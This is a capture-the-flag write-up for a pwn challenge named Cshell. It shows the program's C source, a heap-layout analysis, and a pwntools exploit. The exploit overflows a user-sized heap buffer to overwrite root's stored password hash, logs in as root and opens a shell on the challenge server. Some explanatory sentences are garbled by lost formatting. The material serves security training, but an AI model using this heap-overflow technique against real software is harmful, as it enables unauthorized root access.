## Cshell

Source code for this challenge: 
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <crypt.h>

//gcc Cshell.c -static -lcrypt -o Cshell
struct users {
	char name[8];
	char passwd[35];
};

struct tracker{
	struct tracker *next;
	struct users *ptr;
	char name[8];
	long int id;
};

char * alex_buff;
char * Charlie_buff;
char * Johnny_buff;
char * Eric_buff;

struct users *user;
struct users *root;

struct tracker *root_t;
struct tracker *user_t;

char *username[8];
char *userbuffer;
int uid=1000;
int length;
char salt[5] = "1337\0";
char *hash;
void setup(){
	char password_L[33];
	puts("Welcome to Cshell, a very restricted shell.\nPlease create a profile.");
	printf("Enter a username up to 8 characters long.\n> ");
	scanf("%8s",username);
	printf("Welcome to the system %s, you are our 3rd user. We used to have more but some have deleted their accounts.\nCreate a password.\n> ",username);
	scanf("%32s",&password_L);
	hash = crypt(password_L,salt);
	printf("How many characters will your bio be (200 max)?\n> ");
	scanf("%d",&length);
	userbuffer = malloc(length + 8);
	printf("Great, please type your bio.\n> ");
	getchar();
	fgets((userbuffer + 8),201,stdin);
}

void logout(){
	fflush(stdin);
	getchar();
	struct tracker *ptr;
	printf("Username:");
	char username_l[9];
	char password_l[32];
	char *hash;
	scanf("%8s",username_l);
	for (ptr = root_t; ptr != NULL; ptr = root_t->next) {


        if (strcmp(ptr->name, username_l) == 0) {
		printf("Password:");
	    scanf("%32s",password_l);
	    hash = crypt(password_l,salt);
	    if (strcmp(hash,ptr->ptr->passwd) == 0){
		    strcpy(username,ptr->name);
		    uid = ptr->id;
		    puts("Authenticated!");
		    menu();
	    }
	    else{
		    puts("Incorrect");
		    logout();
	    }
			 
        }
	else
	{
		if (ptr->next==0)
		{
			puts("Sorry no users with that name.");
			logout();
		}
	}
    }
}
void whoami(){
	printf("%s, uid: %d\n",username,uid);
	menu();
}
void bash(){

	if (uid == 0){
		system("bash");
	}
	else 
	{
		puts("Who do you think you are?");
		exit(0);
	}

}

void squad(){
	puts("..");
	menu();
}

void banner(){

puts("       /\\");
puts("      {.-}");
puts("     ;_.-'\\");
puts("    {    _.}_");
puts("    \\.-' /  `,");
puts("     \\  |    /");
puts("      \\ |  ,/");
puts("       \\|_/");
puts("");
}
void menu(){
	puts("+----------------------+");
	puts("|        Commands      |");
	puts("+----------------------+");
	puts("| 1. logout            |");
	puts("| 2. whoami            |");
	puts("| 3. bash (ROOT ONLY!) |");
	puts("| 4. squad             |");
	puts("| 5. exit              |");
	puts("+----------------------+");
	int option;
	printf("Choice > ");
	scanf("%i",&option);
	switch(option){
		case 1:
			logout();
		case 2:
			whoami();
		case 3:
			bash();
		case 4:
			squad();
		case 5:
			exit(0);
		default:
			puts("[!] invalid choice \n");
			break;
	}
}
void history(){
	alex_buff = malloc(0x40);
	char alex_data[0x40] = "Alex\nJust a user on this system.\0";
	char Johnny[0x50] = "Johnny\n Not sure why I am a user on this system.\0";
	char Charlie[0x50] ="Charlie\nI do not trust the security of this program...\0";
	char Eric[0x60] = "Eric\nThis is one of the best programs I have ever used!\0";
	strcpy(alex_buff,alex_data);
	Charlie_buff = malloc(0x50);
	strcpy(Charlie_buff,Charlie);
	Johnny_buff = malloc(0x60);
	strcpy(Johnny_buff,Johnny);
	Eric_buff = malloc(0x80);
	strcpy(Eric_buff,Eric);
	free(Charlie_buff);
	free(Eric_buff);
}

int main(){
	setvbuf(stdout, 0 , 2 , 0);
	setvbuf(stdin, 0 , 2 , 0);
	root_t = malloc(sizeof(struct tracker));
	user_t = malloc(sizeof(struct tracker));
	history();
	banner();
	user = malloc(sizeof(struct users )* 4);
	root = user + 1;
	strcpy(user->name,"tempname");
	strcpy(user->passwd,"placeholder");
	strcpy(root->name,"root");
	strcpy(root->passwd,"guessme:)");
	strcpy(root_t->name,"root");
	root_t->ptr = root;
	root_t->id = 0;
	root_t->next = user_t;
	setup();
	strcpy(user->name,username);
	strcpy(user->passwd,hash);
	strcpy(user_t->name,username);
	user_t->id=1000;
	user_t->ptr = user;
	user_t->next = NULL;
	menu();
	return 0;
}
```
#### Struc heap

The binary allocates 2 chunks on the heap of the same sizes.

root_t: 0x20 (0x30) --> FastBinChunk.
user_t: 0x20 (0x30) --> FastBinChunk.
There are 2 objects that are free() from the heap and they are of the following sizes:

Eric_buff : 0x80 (0x90) --> This is a smallbin chunk.
Charlie_buff : 0x50 (0x60) --> This is a fastbin chunk.
Both of these chunks fill up the tcache but in different indexes. Since they are of different sizes.
There is an allocation of the user object that is of the type struct_user and then the root allocation of the type struct_user. They are allocated in the following way.

```
+-------------------------------+
 | 	Address of root_t	 |
 +-------------------------------+
 |	Address of user_t        |
 +-------------------------------+
 | 	alex_buff		 |
 +-------------------------------+
 |	charlie_buff 	         |  ----> This is a freed fastbin chunk (Inside the Tcache)
 +-------------------------------+	
 |	johnyy buff		 |
 +-------------------------------+
 |	eric_buff		 |  -----> This is a freed SmallBinChunk (Inside the Tcache)
 +-------------------------------+
 |	user			 |
 +-------------------------------+
 | 	root 			 |
 +-------------------------------+
 
 ```
 
user = malloc(sizeof(struct users)*4)

root = user + 1

There follows a couple of str copies. They copy strings into the and buffers.user -> nameroot -> name

The setup() function is called that allows us to do the following:

Enter the username and password.
Specify our own size to and input into this buffer is limited to 201 bytes. Therefore this can be a possible heap overflow when we allocate a chunk of size < 200 bytes 😄malloc()
The logout function looks intresting since it does the following.

It gets the name of the user
There is a loop that checks for the username and checks if the user exists if not, the program exists; if True the programs asks for the password and updates uid
Using the user and password will never work since when we enter a password it is hashed first then checks against the password that is stored in . Therefore our hashed will be strcompared against the unhashed and this will never be true.rootguessme=)ptr -> ptr -> passwordguessme=)guessme=)


#### Exploit:

```
from pwn import * 

BIN = "./Cshell"

top_heap = 0x5186b0 
username = b"malwar3"
pswd = b"s4db0iz"
crypt_pass = b"13uA68F2TJ9vI"

def exploit():
	io.recvuntil("> ")
	io.sendline(username)
	io.recvuntil("> ")
	io.sendline(pswd)
	io.recvuntil("> ")
	io.sendline(b"120")
	payload = b"a"*187 + crypt_pass
	io.recvuntil("> ")
	io.sendline(payload)
	io.recvuntil("Choice > ")
	io.sendline(b"1")
	io.recvuntil("Username:")
	io.sendline("root")
	io.recvuntil("Password:")
	io.sendline(pswd)
	io.recvuntil("Choice >")
	io.sendline(b"3")
	io.interactive()


io = remote("pwn.be.ax", 5001)
#io = process(BIN)
exploit()
```
